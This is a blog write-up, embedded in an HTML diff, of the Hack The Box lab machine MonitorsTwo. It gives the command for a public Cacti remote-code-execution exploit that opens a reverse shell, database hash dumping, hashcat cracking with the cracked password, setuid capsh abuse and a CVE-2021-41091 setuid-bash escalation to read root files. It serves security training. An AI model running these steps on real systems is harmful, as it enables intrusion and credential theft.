@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html><head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Hack The Box: MonitorsTwo - Danp&#39;s Personal Blog</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content=" MonitorsTwo is an easy machine hosted at hackthebox. To get user we need to exploit the cacti service with a public exploit in order to get a shell inside a docker container. We grab the password hash from the user and crack with hashcat. Root part is about exploit the CVE-2021-41091, which allows otherwise unprivileged Linux users to traverse directory contents and execute programs." />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="Hack The Box: MonitorsTwo" />
+<meta property="og:description" content=" MonitorsTwo is an easy machine hosted at hackthebox. To get user we need to exploit the cacti service with a public exploit in order to get a shell inside a docker container. We grab the password hash from the user and crack with hashcat. Root part is about exploit the CVE-2021-41091, which allows otherwise unprivileged Linux users to traverse directory contents and execute programs." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://danp.bz/posts/hackthebox-monitorstwo/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-09-05T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-09-05T00:00:00+00:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Hack The Box: MonitorsTwo"/>
+<meta name="twitter:description" content=" MonitorsTwo is an easy machine hosted at hackthebox. To get user we need to exploit the cacti service with a public exploit in order to get a shell inside a docker container. We grab the password hash from the user and crack with hashcat. Root part is about exploit the CVE-2021-41091, which allows otherwise unprivileged Linux users to traverse directory contents and execute programs."/>
+<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+	<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@1,500&display=swap" rel="stylesheet">
+        <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet">
+        <link href="https://fonts.googleapis.com/css?family=Roboto+Mono" rel="stylesheet">
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="https://danp.bz/css/main.5a1df495afe53092e2ad0c172adb2250810f442ca165c5f85673cb3b860f3468.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="https://danp.bz/css/dark.134db564d2aacf16987413a93acdb0fdfe7ada0bd1972f2871066b32c9277a7b.css"  disabled />
+	
+
+	
+	
+
+	
+	
+	
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="https://danp.bz">Danp&#39;s Personal Blog</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/whoami">Whoami</a>
+		
+		<a href="/tags">Tags</a>
+		
+		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
+		<script src="https://danp.bzjs/themetoggle.js"></script>
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">Hack The Box: MonitorsTwo</h1>
+			<div class="meta">Posted on Sep 5, 2023</div>
+		</div>
+		
+
+		<section class="body">
+			<ul>
+<li><a href="#overview">Overview</a></li>
+<li><a href="#nmap">Nmap</a></li>
+<li><a href="#exploiting-cve-2022-46169">Exploiting CVE-2022-46169</a></li>
+<li><a href="#container-enumeration">Container Enumeration</a></li>
+<li><a href="#cracking-hashes">Cracking Hashes</a></li>
+<li><a href="#enumeration-as-marcus">Enumeration as Marcus</a>
+<ul>
+<li><a href="#checking-out-what-is-running">Checking Out What is Running</a></li>
+<li><a href="#rooting-containers">Rooting Containers</a></li>
+<li><a href="#getting-root">Getting Root</a></li>
+</ul>
+</li>
+<li><a href="#intended-enumeration-path">Intended Enumeration Path</a></li>
+</ul>
+<h1 id="overview">Overview</h1>
+<ol>
+<li>Exploit cacti version 1.2.22 to get a shell inside a docker container</li>
+<li>Enumerate internal files to acess the database and find a hash for the user marcus</li>
+<li>Crack the blowfish hash with hashcat</li>
+<li>Ssh in as marcus</li>
+<li>Abuse CVE-2021-41091 to get root shell</li>
+</ol>
+<h1 id="nmap">Nmap</h1>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>danp@local:~/Documents/HackTheBox/MonitorsTwo|⇒  nmap -sV -sC 10.10.11.211
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-05 16:49 -03
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.11.211
+</span></span><span style="display:flex;"><span>Host is up (0.094s latency).
+</span></span><span style="display:flex;"><span>Not shown: 998 closed tcp ports (conn-refused)
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+</span></span><span style="display:flex;"><span>|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+</span></span><span style="display:flex;"><span>|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 (Ubuntu)
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 (Ubuntu)
+</span></span><span style="display:flex;"><span>|_http-title: Login to Cacti
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap done: 1 IP address (1 host up) scanned in 29.74 seconds
+</span></span></code></pre></div><ul>
+<li><code>-sV</code>: Enumerate the versions of the services</li>
+<li><code>-sC</code>: Run default some nmap&rsquo;s default scripts</li>
+</ul>
+<p>We spot two open ports, 22/TCP(SSH) and 80/TCP(HTTP), let&rsquo;s check out the HTTP port first.</p>
+<h1 id="exploiting-cve-2022-46169">Exploiting CVE-2022-46169</h1>
+<p><img src="/monitorstwo-img/Login_to_Cacti.png" alt="image1"></p>
+<p>We can easily see the version of <a href="https://github.com/Cacti/cacti">Cacti</a> running, 1.2.22. There is a public exploit for this version, it is related to <code>CVE-2022-46169</code>. This awesome <a href="https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22">Github</a> page already gives us a working exploit.</p>
+<p>According to <a href="https://pentest-tools.com/vulnerabilities-exploits/cacti-remote-code-execution_CVE-2022-46169">Pentest-tools</a>:</p>
+<blockquote>
+<p>Cacti server is vulnerable to CVE-2022-46169, a Remote Code Execution vulnerability in the remote_agent.php file. The vulnerability exists due to insufficient authorization within the Remote Agent when handling HTTP requests with a custom Forwarded-For HTTP header .A remote non-authenticated attacker can send a specially crafted HTTP request to the affected instance and execute arbitrary OS commands on the server.</p>
+</blockquote>
+<p>Following the instructions of the github page, we run the command:</p>
+<p><code>python3 CVE-2022-46169.py -u http://10.10.11.211 --LHOST=10.10.14.88 --LPORT=9001</code></p>
+<ul>
+<li><code>--LHOST</code>: My local machine&rsquo;s ip</li>
+<li><code>--LPORT</code>: My local machine&rsquo;s port</li>
+<li><code>-u</code>: Target ip</li>
+</ul>
+<p><img src="/monitorstwo-img/ncat_-nvlp_9001.png" alt="image2"></p>
+<p>We are now able to run commands directly on the server.</p>
+<h1 id="container-enumeration">Container Enumeration</h1>
+<p>Enumerating a bit, we discover that we are actually inside a docker container. We still need to find what user holds the <code>user.txt</code> file and how we can exploit this fellow. Looking at the <code>entrypoint.sh</code> file on the root directory:</p>
+<p><code>cat /entrypoint.sh</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic">#!/bin/bash
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic"></span>set -ex
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>wait-for-it db:3306 -t <span style="color:#0086f7;font-weight:bold">300</span> -- echo <span style="color:#0086d2">&#34;database is connected&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span><span style="color:#fb660a;font-weight:bold">if</span> [[ ! <span style="color:#fb660a;font-weight:bold">$(</span>mysql --host=db --user=root --password=root cacti -e <span style="color:#0086d2">&#34;show tables&#34;</span><span style="color:#fb660a;font-weight:bold">)</span> =~ <span style="color:#0086d2">&#34;automation_devices&#34;</span> ]]; <span style="color:#fb660a;font-weight:bold">then</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    mysql --host=db --user=root --password=root cacti &lt; /var/www/html/cacti.sql
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>    mysql --host=db --user=root --password=root cacti -e <span style="color:#0086d2">&#34;UPDATE user_auth SET must_change_password=&#39;&#39; WHERE username = &#39;admin&#39;&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    mysql --host=db --user=root --password=root cacti -e <span style="color:#0086d2">&#34;SET GLOBAL time_zone = &#39;UTC&#39;&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span><span style="color:#fb660a;font-weight:bold">fi</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>chown www-data:www-data -R /var/www/html
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span><span style="color:#080;background-color:#0f140f;font-style:italic"># first arg is `-f` or `--some-option`</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span><span style="color:#fb660a;font-weight:bold">if</span> [ <span style="color:#0086d2">&#34;</span><span style="color:#0086d2">${</span><span style="color:#fb660a">1</span>#-<span style="color:#0086d2">}</span><span style="color:#0086d2">&#34;</span> != <span style="color:#0086d2">&#34;</span><span style="color:#fb660a">$1</span><span style="color:#0086d2">&#34;</span> ]; <span style="color:#fb660a;font-weight:bold">then</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>	set -- apache2-foreground <span style="color:#0086d2">&#34;</span><span style="color:#fb660a">$@</span><span style="color:#0086d2">&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span><span style="color:#fb660a;font-weight:bold">fi</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>exec <span style="color:#0086d2">&#34;</span><span style="color:#fb660a">$@</span><span style="color:#0086d2">&#34;</span>
+</span></span></code></pre></div><p>We can extract some valuable info from this piece of code:</p>
+<ol>
+<li>On line 4 we see the container accessing db:3306, which tells us that another container is running this service.</li>
+<li>We can query the database as root according to line 5</li>
+</ol>
+<p>let&rsquo;s find out more about this database:</p>
+<p><code>mysql --host=db --user=root --password=root cacti -e &quot;status&quot;</code></p>
+<ul>
+<li><code>--host</code>: specifies where the service is being hosted</li>
+<li><code>--user</code>: user to log in</li>
+<li><code>--password</code>: user&rsquo;s password 🤯</li>
+<li><code>cacti</code>: The database we want to query</li>
+<li><code>-e</code>: The query we want to run</li>
+</ul>
+<p>Since we are in a very poor shell, we cannot use <code>mysql</code> interactively. Our way out is to send the command as an argument.</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>mysql  Ver 15.1 Distrib 10.5.15-MariaDB, for debian-linux-gnu (x86_64) using  EditLine wrapper
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Connection id:		428
+</span></span><span style="display:flex;"><span>Current database:	cacti
+</span></span><span style="display:flex;"><span>Current user:		root@172.19.0.3
+</span></span><span style="display:flex;"><span>SSL:			Not in use
+</span></span><span style="display:flex;"><span>Current pager:		stdout
+</span></span><span style="display:flex;"><span>Using outfile:		&#39;&#39;
+</span></span><span style="display:flex;"><span>Using delimiter:	;
+</span></span><span style="display:flex;"><span>Server:			MySQL
+</span></span><span style="display:flex;"><span>Server version:		5.7.40 MySQL Community Server (GPL)
+</span></span><span style="display:flex;"><span>Protocol version:	10
+</span></span><span style="display:flex;"><span>Connection:		db via TCP/IP
+</span></span><span style="display:flex;"><span>Server characterset:	latin1
+</span></span><span style="display:flex;"><span>Db     characterset:	latin1
+</span></span><span style="display:flex;"><span>Client characterset:	latin1
+</span></span><span style="display:flex;"><span>Conn.  characterset:	latin1
+</span></span><span style="display:flex;"><span>TCP port:		3306
+</span></span><span style="display:flex;"><span>Uptime:			3 hours 41 min 42 sec
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Threads: 6  Questions: 31330  Slow queries: 0  Opens: 330  Flush tables: 1  Open tables: 323  Queries per second avg: 2.355
+</span></span><span style="display:flex;"><span>--------------
+</span></span></code></pre></div><p>We can see the ip <code>172.19.0.3</code>, that might be inportant for later.</p>
+<p>Now that we know how to query data, let&rsquo;s search for user info.</p>
+<ol>
+<li><code>mysql --host=db --user=root --password=root cacti -e &quot;show tables&quot;</code></li>
+<li>Find the <code>user_auth</code> table</li>
+<li><code>mysql --host=db --user=root --password=root cacti -e &quot;select username,password from user_auth&quot;</code></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>bash-5.1$ mysql --host=db --user=root --password=root cacti -e &#34;select username,password from user_auth&#34;
+</span></span><span style="display:flex;"><span>&lt; cacti -e &#34;select username,password from user_auth&#34;
+</span></span><span style="display:flex;"><span>username	password
+</span></span><span style="display:flex;"><span>admin	$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC
+</span></span><span style="display:flex;"><span>guest	43e9a4ab75570f5b
+</span></span><span style="display:flex;"><span>marcus	$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
+</span></span></code></pre></div><h1 id="cracking-hashes">Cracking Hashes</h1>
+<p>We see the marcus user with a hash that appers to be <code>bcrypt</code>. This hash is very hard to break since dictionary attacks take too long to run even for small wordlists. In order to crack it, let&rsquo;s user <a href="https://github.com/hashcat/hashcat">Hashcat</a> with mode 3200, as stated by the official example <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">page</a>.</p>
+<p><code>hashcat -m 3200 hash.txt rockyou.txt</code></p>
+<ul>
+<li><code>-m</code>: Hashcat mode</li>
+<li><code>hash.txt</code>: Text file containing the hash we want to break</li>
+<li><code>rockyou.txt</code>: Wordlist</li>
+</ul>
+<p>After a few minutes we get a hit: <code>$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey</code></p>
+<p>Let&rsquo;s ssh in and get our user flag ⚐⚐⚐</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>danp@local:~/Documents/HackTheBox/MonitorsTwo|⇒  ssh marcus@10.10.11.211
+</span></span><span style="display:flex;"><span>marcus@10.10.11.211&#39;s password:
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span> .........
+</span></span><span style="display:flex;"><span> .........
+</span></span><span style="display:flex;"><span>Last login: Mon Jun  5 20:03:11 2023 from 10.10.14.35
+</span></span><span style="display:flex;"><span>marcus@monitorstwo:~$ cat user.txt
+</span></span><span style="display:flex;"><span>93bc8&lt;redacted&gt;90d6
+</span></span><span style="display:flex;"><span>marcus@monitorstwo:~$
+</span></span></code></pre></div><h1 id="enumeration-as-marcus">Enumeration as Marcus</h1>
+<p>This root part took more than it should because I totally overlooked some important information from the <code>Linpeas.sh</code> script. I&rsquo;ll demontrate here how I solved it and at the end I&rsquo;l l show what the intended way was to figure out what to do to get root.</p>
+<h2 id="checking-out-what-is-running">Checking Out What is Running</h2>
+<p>After a while enumerating the box I decided to take a closer look at the containers running on the machine once again. I used <code>ps -aux | grep root</code> to list all the processes and filter the ones running as the root user.</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>root        1243  0.0  0.2 1451932 11260 ?       Sl   16:45   0:00 /usr/bin/containerd-shim-runc-v2 -namespace moby -id e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69 -address /run/containerd/containerd.sock
+</span></span><span style="display:flex;"><span>root        1344  0.0  0.0 1222408 3280 ?        Sl   16:45   0:00 /usr/sbin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080 -container-ip 172.19.0.3 -container-port 80
+</span></span><span style="display:flex;"><span>root        1359  0.0  0.2 1451932 10276 ?       Sl   16:45   0:00 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e -address /run/containerd/containerd.sock
+</span></span></code></pre></div><p>These three processes caught my attention, the <code>-id</code> parameter most likely is showing the id of the containers running, we saw that there are two of them, 172.0.19.2 and 172.0.19.3. The last piece of the puzzle was to learn what is that <code>moby</code> namespace. A quick google search showed me this:</p>
+<p>From the <a href="https://mobyproject.org/">Moby</a> website:</p>
+<blockquote>
+<p>Moby is an open framework created by Docker to assemble specialized container systems without reinventing the wheel. It provides a “lego set” of dozens of standard components and a framework for assembling them into custom platforms. At the core of Moby is a framework to assemble specialized container systems which provides:</p>
+</blockquote>
+<p>Open framework? Let&rsquo;s see if it has any CVE for privilege escalation.</p>
+<p><img src="/monitorstwo-img/moby-cve.png" alt="image3"></p>
+<p>According to the CVE description we need two things to make this work:</p>
+<ol>
+<li>Docker version to be &lt; 20.10.9</li>
+<li>We need to find a way to change the permissions of the /bin/bash binary and set the setuid bit on it.</li>
+</ol>
+<p>The <code>setuid</code> says that the binary will have the permission of the owner of the file, not the user who lauched it. Since <code>/bin/bash</code> binary is owned by root, we get arbitrary high privileges commands.</p>
+<p>Let&rsquo;s first check the docker version:</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>marcus@monitorstwo:~$ docker --version
+</span></span><span style="display:flex;"><span>Docker version 20.10.5+dfsg1, build 55c4c88
+</span></span></code></pre></div><p>✅  Docker version 20.10.5 &lt; 20.10.9</p>
+<h2 id="rooting-containers">Rooting Containers</h2>
+<p>In order to change the permissions of the <code>/bash</code> binary, we need to be root inside the container. Enumerating the container, we find that <code>capsh</code> has <code>setuid</code> bit set. We can use to become root:</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>find / -perm /4000 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>/usr/bin/passwd
+</span></span><span style="display:flex;"><span>/usr/bin/chsh
+</span></span><span style="display:flex;"><span>/usr/bin/chfn
+</span></span><span style="display:flex;"><span>/usr/bin/newgrp
+</span></span><span style="display:flex;"><span>/sbin/capsh
+</span></span><span style="display:flex;"><span>/bin/mount
+</span></span><span style="display:flex;"><span>/bin/umount
+</span></span><span style="display:flex;"><span>/bin/su
+</span></span></code></pre></div><p>According to <a href="https://gtfobins.github.io/gtfobins/capsh/#suid">gtfobins</a>:</p>
+<p><code>capsh --gid=0 --uid=0 --</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>www-data@50bca5e748b0:/var/www/html$ capsh --gid=0 --uid=0 --
+</span></span><span style="display:flex;"><span>capsh --gid=0 --uid=0 --
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>uid=0(root) gid=0(root) groups=0(root),33(www-data)
+</span></span></code></pre></div><p>Now that we are root, let&rsquo;s change /bin/bash permission&rsquo;s.</p>
+<p>✅ <code>chmod u+s /bin/bash</code></p>
+<h2 id="getting-root">Getting Root</h2>
+<p>We now have everything we need to exploit the main host. Let&rsquo;s start by running <code>findmnt</code> in order to find where the containers era mounted.</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
+</span></span><span style="display:flex;"><span>.........
+</span></span><span style="display:flex;"><span>├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+</span></span></code></pre></div><p>We have those two candidates, In order to make this short let&rsquo;s focus on the correct one, <code>c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1</code>. We can send commands that will use the container&rsquo;s permissions but will execute on the main host. example:</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>marcus@monitorstwo:/var/lib/docker$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -c &#34;cat /etc/passwd&#34;
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>...............
+</span></span><span style="display:flex;"><span>marcus:x:1000:1000:,,,:/home/marcus:/bin/bash
+</span></span><span style="display:flex;"><span>fwupd-refresh:x:113:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>_laurel:x:997:997::/var/log/laurel:/bin/false
+</span></span></code></pre></div><p>Since we changed the permissions of the /bin/bash binary we can read the root flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>marcus@monitorstwo:/var/lib/docker$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p -c &#34;cat /root/root.txt&#34;
+</span></span><span style="display:flex;"><span>9874&lt;redacted&gt;036a
+</span></span></code></pre></div><ul>
+<li><code>-p</code>: This option lets bash keep the effective userid it is launched with, wheras without it, it will set the effective uid to the actual uid (your user)</li>
+<li><code>-c</code>: Execute specific command</li>
+</ul>
+<h1 id="intended-enumeration-path">Intended Enumeration Path</h1>
+<p>If I would have gone to <code>/var/mail/marcus</code> I would have seen this email that gives us a major hint on what to do :s</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>marcus@monitorstwo:/var/mail$ cat marcus
+</span></span><span style="display:flex;"><span>From: administrator@monitorstwo.htb
+</span></span><span style="display:flex;"><span>To: all@monitorstwo.htb
+</span></span><span style="display:flex;"><span>Subject: Security Bulletin - Three Vulnerabilities to be Aware Of
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Dear all,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Best regards,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Administrator
+</span></span><span style="display:flex;"><span>CISO
+</span></span><span style="display:flex;"><span>Monitor Two
+</span></span><span style="display:flex;"><span>Security Team
+</span></span></code></pre></div><p>That would have saved me some good time!</p>
+<p>🐇 That&rsquo;s all folks ~</p>
+
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/hackthebox">hackthebox</a></li>
+					
+					<li><a href="/tags/easy">easy</a></li>
+					
+					<li><a href="/tags/docker">docker</a></li>
+					
+					<li><a href="/tags/cacti">cacti</a></li>
+					
+					<li><a href="/tags/hashcat">hashcat</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/D4n-P" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a><a class="soc" href="https://twitter.com/dan_ps__" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
+    <a class="border"></a><a class="soc" href="https://www.linkedin.com/in/danielspatricio/" rel="me" title="Linkedin"><i data-feather="linkedin"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    Feel free to reach me at any of my social media 🎃
+  </div>
+</footer>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-164145585-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
